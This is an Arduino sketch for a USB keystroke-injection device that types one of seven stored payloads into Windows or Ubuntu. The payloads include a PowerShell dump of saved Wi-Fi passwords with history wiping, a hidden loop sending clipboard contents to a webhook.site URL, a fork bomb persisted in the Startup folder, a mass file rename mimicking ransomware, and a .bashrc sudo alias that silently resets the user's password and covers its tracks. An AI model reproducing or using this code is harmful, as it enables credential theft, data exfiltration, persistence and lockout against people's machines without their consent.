#include <EEPROM.h>
#include <Keyboard.h>

void payload1() {
  // Type logo in cmd

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println(F("cmd /c echo --------------&echo    MM&echo   ^<' \\___/^|&echo     \\_  _/&echo       ][&echo pwned by Pecky&echo --------------&timeout /t 10"));
}

void payload2() {
  // Get all wifi passwords

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println(F("conhost powershell"));
  delay(2000);
  Keyboard.println(F("$w=Out-String -InputObject((netsh wlan show profiles)|Select-String \":(.+)$\"|%{$name=$_.Matches.Groups[1].Value.Trim(); $_}|%{(netsh wlan show profile name=\"$name\" key=clear)}|Select-String \"Key Content\\W+\\:(.+)$\"|%{$pass=$_.Matches.Groups[1].Value.Trim(); $_}|%{[PSCustomObject]@{ SSID=$name;PASSWORD=$pass }}|Format-Table -AutoSize) -Width 100;cls;echo $w;del (Get-PSReadLineOption).HistorySavePath;timeout /t -1;exit"));
}

void payload3() {
  // Clipboard to webhook

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println(F("conhost powershell -WindowStyle Hidden $e=$null;while($true){$c=Get-Clipboard;if($c){if($c-ne$e){iwr -Uri \\\"https://webhook.site/1d3276f5-2e3c-49a8-8b74-8d39a34ed675\\\" -Method 'Post' -Body $c;}$e=$c;}$e=$c;sleep -s 1;}"));
}

void payload4() {
  // Fork bomb with persistence

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println(F("powershell cd $env:APPDATA\\Microsoft\\Windows\\'Start Menu'\\Programs\\Startup;echo '@echo off' 'cd \"%\"appdata\"%\"\\Microsoft\\Windows\\\\\\\"Start Menu\\\"\\Programs\\Startup' ':a' 'echo KILL ME' 'start aah.bat' 'goto a'|Out-File aah.bat -Encoding ascii;cmd /c aah.bat"));
}

void payload5() {
  // Fake ransomware rename

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println(F("conhost powershell gci $env:userprofile\\*.* -rec|ren -n {$_.name + \\\".peckyou\\\"}"));
}

void payload6() {
  // Fake ransomware revert

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println(F("conhost powershell gci $env:userprofile\\*.* -rec|ren -n {$_.name.substring(0,$_.name.length-8)}"));
}

void payload7() {
  // (Ubuntu) Change user password on next sudo and lock out

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('t');
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.println(F("cp .bashrc /tmp/.font_cache;echo \"alias sudo='echo \\\"$USER:peckylover\\\" | sudo chpasswd;unalias sudo;mv /tmp/.font_cache .bashrc;systemctl suspend;'\" >> .bashrc;history -c;exit"));
}


const uint8_t BUTTON = 2;
const uint8_t LED    = 3;
const uint8_t PAYLOAD_NUM_SAVE_ADDR = 0;

void blinkLed(int count, int interval) {
  for (int i = 0; i < count; i++) {
    digitalWrite(LED, HIGH);
    delay(interval);
    digitalWrite(LED, LOW);
    delay(interval);
  }
}

void programmingMode() {
  EEPROM.update(PAYLOAD_NUM_SAVE_ADDR, 0);
  blinkLed(3, 80);
  bool lastButtonState = LOW;
  uint8_t buttonPushCounter = 0;
  unsigned long lastButtonPushTime = 0;
  for (;;) {
    bool buttonState = digitalRead(BUTTON);
    if (buttonState != lastButtonState) {
      if (buttonState == LOW) {
        buttonPushCounter++;
        lastButtonPushTime = millis();
        digitalWrite(LED, HIGH);
        delay(50);
        digitalWrite(LED, LOW);
      }
      delay(50);
    }
    lastButtonState = buttonState;

    if (buttonPushCounter && millis() - lastButtonPushTime > 1000) {
      EEPROM.update(PAYLOAD_NUM_SAVE_ADDR, buttonPushCounter);
      blinkLed(buttonPushCounter, 200);
      buttonPushCounter = 0;
    }
  }
}

void attackMode() {
  digitalWrite(LED, HIGH);
  Keyboard.begin();
  delay(1000);
  uint8_t payloadNum = EEPROM.read(PAYLOAD_NUM_SAVE_ADDR);
  bool payloadExecuted = true;
  switch (payloadNum) {
    case 1:
      payload1();
      break;
    case 2:
      payload2();
      break;
    case 3:
      payload3();
      break;
    case 4:
      payload4();
      break;
    case 5:
      payload5();
      break;
    case 6:
      payload6();
      break;
    case 7:
      payload7();
      break;
    default:
      payloadExecuted = false;
      break;        
  }
  Keyboard.end();

  if (payloadExecuted) {
    for (;;) {
      digitalWrite(LED, LOW);
      delay(1000);
      digitalWrite(LED, HIGH);
      delay(80);
      digitalWrite(LED, LOW);
      delay(150);
      digitalWrite(LED, HIGH);
      delay(80);
    }
  } else {
    for (;;);
  }
}

void setup() {
  pinMode(BUTTON, INPUT_PULLUP);
  pinMode(LED, OUTPUT);

  if (digitalRead(BUTTON) == LOW || EEPROM.read(PAYLOAD_NUM_SAVE_ADDR) == 0) {
    programmingMode();
  } else {
    attackMode();
  }
}

void loop() {}
